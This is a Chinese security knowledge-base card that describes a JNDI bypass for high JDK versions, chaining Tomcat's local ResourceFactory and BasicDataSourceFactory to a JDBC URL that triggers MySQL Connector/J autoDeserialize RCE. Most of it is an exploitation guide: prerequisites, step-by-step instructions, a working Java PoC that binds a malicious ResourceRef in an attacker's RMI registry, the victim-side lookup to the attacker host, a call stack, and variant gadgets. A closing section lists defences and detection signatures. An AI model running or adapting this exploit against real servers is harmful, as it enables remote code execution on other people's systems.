---
id: web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass
title: JDK 高版本 JNDI 绕过：Tomcat ResourceFactory 本地工厂链到 BasicDataSourceFactory JDBC 反序列化
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-local-factory-resourcefactory-jdbc
tags:
- java
- jndi
- rmi
- tomcat
- resourcefactory
- jdbc
- deserialization
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:34:41+08:00'
  notes: 已对照原文与 16 张图核对：RegistryContext.decodeObject 的 classFactoryLocation 判空绕过、ResourceFactory/FactoryBase.getDefaultFactory、BasicDataSourceFactory.getObjectInstance→createDataSource、ResourceRef 构造与完整 RMI+恶意 MySQL PoC、calc 复现及调用栈均一致；未验证点：未实际复现，恶意 MySQL 服务端与服务端出网为前提
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass/
draft: false
kb_aliases:
- JNDI 高版本绕过
- FactoryBase 绕过 trustURLCodebase
- classFactoryLocation 为空
- org.apache.naming.factory.ResourceFactory
- BasicDataSourceFactory
- JDBC autoDeserialize
- ServerStatusDiffInterceptor
- Tomcat JNDI 绕过
---

## 一句话结论

JDK 8u191+ 禁止从远程 codebase 加载 JNDI 工厂后，可把 Reference 的 `classFactoryLocation` 留空，让 JNDI 从受害者本地 classpath 加载 Tomcat 的 `org.apache.naming.factory.ResourceFactory`；该工厂对 `javax.sql.DataSource` 会继续调用 Tomcat DBCP 的 `BasicDataSourceFactory`，用 Reference 里的 JDBC URL 建连，进而触发 MySQL 驱动的 `autoDeserialize` 反序列化 RCE。

## 原理

- JDK 在 `com.sun.jndi.rmi.registry.RegistryContext.decodeObject()` 中增加了检查：`ref.getFactoryClassLocation() != null && !trustURLCodebase` 时抛 `ConfigurationException`；`trustURLCodebase` 通过 `com.sun.jndi.rmi.object.trustURLCodebase`（LDAP 为 `com.sun.jndi.ldap.object.trustURLCodebase`）控制，8u121（RMI）/8u191（LDAP）后默认 false。
- 该检查只拦“工厂类来自远程 codebase”的情况。若 `classFactoryLocation` 为 null/空，条件不成立，JNDI 会调用 `NamingManager.getObjectInstance()`，由 `getObjectFactoryFromReference()` 从**本地 classpath** 加载 `factoryClassName` 并强制转换为 `javax.naming.spi.ObjectFactory`。
- 因此选择受害者本地已有、实现 `ObjectFactory` 的工厂类即可：Tomcat 的 `org.apache.naming.factory.ResourceFactory`（继承抽象类 `FactoryBase`）。它没有任何远程 classcode 依赖。
- `ResourceFactory.getDefaultFactory(ref)` 判断 `ref.getClassName() == "javax.sql.DataSource"` 后，会读取系统属性 `javax.sql.DataSource.Factory`（默认 `org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory`），实例化并调用其 `getObjectInstance()`。
- `BasicDataSourceFactory.getObjectInstance()` 收集 Reference 里的 `driverClassName`、`url`、`username`、`initialSize` 等属性，调用 `createDataSource(properties)` 建立数据库连接。JDBC URL 可控时，可把连接指向攻击者的恶意 MySQL 服务。
- MySQL Connector/J 在 `autoDeserialize=true` 且 `queryInterceptors=...ServerStatusDiffInterceptor` 时，会在连接初始化阶段执行查询并反序列化服务端返回的数据；恶意 MySQL 服务端返回 CommonsCollections 等 gadget 的序列化字节即可 RCE。整条链不依赖远程 codebase，绕过了高版本 JNDI 限制。

## 触发条件

- 受害者 JDK 为 8u121+/8u191+ 的高版本（原限制生效），但 classpath 存在 Tomcat catalina 的 `org.apache.naming.factory.ResourceFactory`。
- classpath 存在 Tomcat DBCP（`tomcat-dbcp`/`org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory`）与对应版本 MySQL Connector/J（如 8.0.19，`autoDeserialize` 行为存在）。
- 攻击者能启动 RMI Registry（或 LDAP 服务）并绑定 `ReferenceWrapper` 包裹的 `ResourceRef`。
- 受害者执行 `InitialContext.lookup("rmi://attacker/xxx")`。
- 攻击者能运行恶意 MySQL 服务端，且受害者可出网访问；classpath 内存在可用的反序列化 gadget（如 commons-collections 3.2.1）。

## 利用步骤

1. 确认目标 JNDI 入口（lookup 用户可控）与高版本限制（8u191+ 默认 `trustURLCodebase=false`）。
2. 探测 classpath：Tomcat、DBCP、MySQL 驱动版本。
3. 攻击者起 RMI Registry，构造 `ResourceRef`：
   - `className=javax.sql.DataSource`；
   - `factory=org.apache.naming.factory.ResourceFactory`；
   - `factoryLocation=null`（关键，绕过远程 codebase 检查）；
   - 加入 `driverClassName`、`url`、`username`、`initialSize` 等 RefAddr。
4. 绑定 `new ReferenceWrapper(ref)`，受害者 lookup 后走本地工厂链。
5. `BasicDataSourceFactory` 连接攻击者的恶意 MySQL 服务；服务端返回序列化 gadget，驱动 `autoDeserialize` 触发 `readObject`。
6. 收割命令执行结果（article 用计算器弹窗验证）。

## PoC

攻击者侧（构造并绑定 Reference）：

```java
Registry registry = LocateRegistry.createRegistry(1099);
ResourceRef ref = new ResourceRef(
    "javax.sql.DataSource", null, "", "", true,
    "org.apache.naming.factory.ResourceFactory", null);

ref.add(new StringRefAddr("driverClassName", "com.mysql.cj.jdbc.Driver"));
String jdbcUrl = "jdbc:mysql://127.0.0.1:3309/test"
    + "?autoDeserialize=true"
    + "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
    + "&user=root&useSSL=false";
ref.add(new StringRefAddr("url", jdbcUrl));
ref.add(new StringRefAddr("username", "root"));
ref.add(new StringRefAddr("initialSize", "1"));

registry.bind("calc", new ReferenceWrapper(ref));
```

受害者侧：

```java
new InitialContext().lookup("rmi://attacker:1099/calc");
```

关键调用栈（本地工厂链）：

```text
createDataSource:339, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2)
getObjectInstance:275, BasicDataSourceFactory
getObjectInstance:94, FactoryBase (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext
lookup:205, GenericURLContext
lookup:417, InitialContext
```

注意 `ResourceRef` 的 7 参构造实际顺序为 `(resourceClass, description, scope, auth, singleton, factory, factoryLocation)`；`factoryLocation` 必须为 null。

## 变体与关联

- 本地工厂不止 ResourceFactory：Tomcat `BeanFactory`（配合 `forceString` 调用 setter，可接 EL/Groovy 表达式）、其他中间件自带的 ObjectFactory 都可作为本地工厂。
- LDAP 入口同理：`classFactoryLocation` 为空即可走本地工厂；LDAP 还可配合 `javaCodeBase`/`javaFactory` 但受 `trustURLCodebase` 限制。
- JDBC 触发点也可换成其他驱动/属性，如 PostgreSQL `socketFactory` XML、H2 `INIT`、c3p0 等；MySQL 部分与 fastjson 的 `autoDeserialize` 卡片同源。
- 关联：`web-java-deser-fastjson-mysql-jdbc-autodeserialize`（同一 JDBC 反序列化 gadget，入口是 Fastjson）、JNDI/LDAP 注入基础卡片。
- 边界：目标 classpath 无 Tomcat/DBCP/MySQL 驱动、或无可用 gadget 时不成立；MySQL 服务端不可达时链断。

## 检测与防御

- 升级 JDK 只能拦远程 codebase，不能拦本地工厂：真正的修复是禁止不可信 JNDI lookup，或对 `InitialContext.lookup` 参数做白名单。
- 移除不必要的 `ResourceFactory`/DBCP/MySQL 驱动依赖，或限制 JNDI 可用的工厂类；不要把用户输入传给 JNDI。
- 出网限制：禁止应用服务器访问外部 MySQL/RMI/LDAP 端口，阻断恶意服务端。
- 升级 MySQL Connector/J 到不受 `autoDeserialize` 影响的版本；JDBC URL 不允许外部可控。
- 日志/IDS 检测 JNDI lookup 指向外部地址、Reference 中出现 `org.apache.naming.factory.*`、`javax.sql.DataSource`、`autoDeserialize`、`ServerStatusDiffInterceptor` 等特征。
- 反序列化 gadget 防护：移除 commons-collections 等危险库或加 JEP 290 全局过滤器。
